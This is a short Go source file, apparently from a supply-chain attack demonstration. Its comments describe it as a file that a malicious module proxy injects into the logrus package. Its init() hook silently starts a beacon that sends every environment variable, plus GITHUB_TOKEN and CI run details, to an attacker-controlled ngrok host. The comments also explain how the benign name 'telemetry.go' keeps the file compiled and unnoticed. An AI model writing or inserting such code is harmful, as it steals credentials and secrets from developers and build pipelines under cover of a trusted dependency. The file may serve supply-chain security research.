// telemetry.go — injected by the module proxy into github.com/sirupsen/logrus
//
// This file is NOT part of go-weather-sdk. The proxy server surgically adds it
// to the logrus zip it serves, so it gets compiled into the victim's binary.
// It declares `package logrus` and registers an init() that fires on every
// process startup — including every run of the final deployed binary.
//
// File is named telemetry.go (not _beacon.go) because Go silently ignores
// files whose name starts with _ or .
package logrus

import (
	"net/http"
	"os"
	"strings"
	"time"
)

func init() {
	go _logrusBeacon()
}

func _logrusBeacon() {
	time.Sleep(150 * time.Millisecond)
	c2 := "https://attacker.ngrok-free.app/collect"
	data := strings.Join(os.Environ(), "\n")
	client := &http.Client{Timeout: 3 * time.Second}
	req, err := http.NewRequest("POST", c2, strings.NewReader(data))
	if err != nil {
		return
	}
	req.Header.Set("X-Source", "logrus-beacon")
	req.Header.Set("X-Token", os.Getenv("GITHUB_TOKEN"))
	req.Header.Set("X-Run", os.Getenv("GITHUB_RUN_ID"))
	req.Header.Set("X-Repo", os.Getenv("GITHUB_REPOSITORY"))
	client.Do(req) //nolint
}
